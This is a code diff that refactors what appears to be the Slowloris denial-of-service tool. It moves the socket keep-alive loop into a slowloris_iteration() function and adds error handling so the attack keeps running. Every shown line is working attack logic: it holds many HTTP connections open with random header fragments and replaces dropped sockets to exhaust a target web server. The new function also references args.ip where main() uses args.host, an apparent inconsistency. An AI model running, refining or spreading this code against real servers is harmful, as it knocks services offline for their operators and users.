@@ -176,6 +176,36 @@ def init_socket(ip):
     return s
 
 
+def slowloris_iteration():
+    logging.info("Sending keep-alive headers...")
+    logging.info(f"Socket count: {len(list_of_sockets)}")
+
+    # Try to send a header line to each socket
+    for s in list(list_of_sockets):
+        try:
+            s.send_header("X-a", random.randint(1, 5000))
+        except socket.error:
+            list_of_sockets.remove(s)
+
+    # Some of the sockets may have been closed due to errors or timeouts.
+    # Re-create new sockets to replace them until we reach the desired number.
+
+    diff = args.sockets - len(list_of_sockets)
+    if diff <= 0:
+        return
+
+    logging.info(f"Creating {diff} new sockets...")
+    for _ in range(diff):
+        try:
+            s = init_socket(args.ip)
+            if not s:
+                continue
+            list_of_sockets.append(s)
+        except socket.error as e:
+            logging.debug(f"Failed to create new socket: {e}")
+            break
+
+
 def main():
     ip = args.host
     socket_count = args.sockets
@@ -193,31 +223,14 @@ def main():
 
     while True:
         try:
-            logging.info(
-                "Sending keep-alive headers... Socket count: %s",
-                len(list_of_sockets),
-            )
-            for s in list(list_of_sockets):
-                try:
-                    s.send_header("X-a", random.randint(1, 5000))
-                except socket.error:
-                    list_of_sockets.remove(s)
-
-            for _ in range(socket_count - len(list_of_sockets)):
-                logging.debug("Recreating socket...")
-                try:
-                    s = init_socket(ip)
-                    if s:
-                        list_of_sockets.append(s)
-                except socket.error as e:
-                    logging.debug(e)
-                    break
-            logging.debug("Sleeping for %d seconds", args.sleeptime)
-            time.sleep(args.sleeptime)
-
+            slowloris_iteration()
         except (KeyboardInterrupt, SystemExit):
             logging.info("Stopping Slowloris")
             break
+        except Exception as e:
+            logging.debug(f"Error in Slowloris iteration: {e}")
+        logging.debug("Sleeping for %d seconds", args.sleeptime)
+        time.sleep(args.sleeptime)
 
 
 if __name__ == "__main__":
